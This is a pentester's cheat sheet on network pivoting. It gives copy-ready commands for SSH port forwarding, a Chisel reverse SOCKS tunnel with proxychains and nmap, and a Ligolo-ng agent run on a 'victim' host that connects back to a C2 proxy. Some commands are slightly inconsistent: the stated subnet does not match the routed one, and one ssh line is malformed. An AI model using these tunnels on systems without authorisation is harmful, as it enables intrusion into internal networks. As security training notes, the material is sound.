
## Port forwarding ssh
##### Option `-L` (Local Port Forwarding)

- **Syntaxe** : `ssh -L [port_local]:[host_remote]:[port_remote] [utilisateur]@[hôte]`
- **Usage** : Redirige un port de votre machine locale vers un port sur la machine distante.
- **Exemple** : `ssh -L 4000:127.0.0.1:3000 johndoe@192.168.1.100`

##### Option `-R` (Remote Port Forwarding)

- **Syntaxe** : `ssh -R [port_remote]:[host_local]:[port_local] [utilisateur]@[hôte]`
- **Usage** : Redirige un port de la machine distante vers un port sur votre machine locale.
		- **Exemple** : `ssh -R 4000:127.0.0.1:3000 johndoe@192.168.1.100`
			```ssh -R1080: pentest@10.0.1.26 -N```

## Chisel / Proxychain

- Get the binary : 
```sh
wget https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz

wget https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_windows_amd64.gz
```

Adds a line to `/etc/proxychains4.conf` to be able to use `proxychains`:

```sh
socks5 127.0.0.1 1080
```

- Download the binary on the remote host and then  : 

```sh
# On your local machine
./chisel server -p 8888 -reverse &
```

```sh
# On the remote host
./chisel client 10.8.3.12:8888 R:1080:socks &
```

```sh
proxychains -q nmap -sT localhost
```

## Ligolo-ng

```sh
Proxy : https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz

Agent_windows : https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip

or 

Agent_linux : 
https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_linux_amd64.tar.gz
```

- Setup Ligolo-ng : 
Start the _proxy_ server on your Command and Control (C2) server (default 11601 listening will be use):

```sh
sudo ip tuntap add user p4v1c mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

- Start the _agent_ on your target (victim) computer (no privileges are required!):
```sh
./agent.exe -connect 10.8.3.12:11601 -ignore-cert
```

Use the `session` command to select the _agent_.

```sh
ligolo-ng » session 
? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000
```

Display the network configuration of the agent using the `ifconfig` command:
Add a route on the _proxy/relay_ server to the _192.168.0.0/24_ _agent_ network : 
```sh
sudo ip route add 10.10.11.0/24 dev ligolo
start
```

- Clean : 
```sh
sudo ip link set dev ligolo down
sudo ip tuntap del dev ligolo mode tun
 ```

 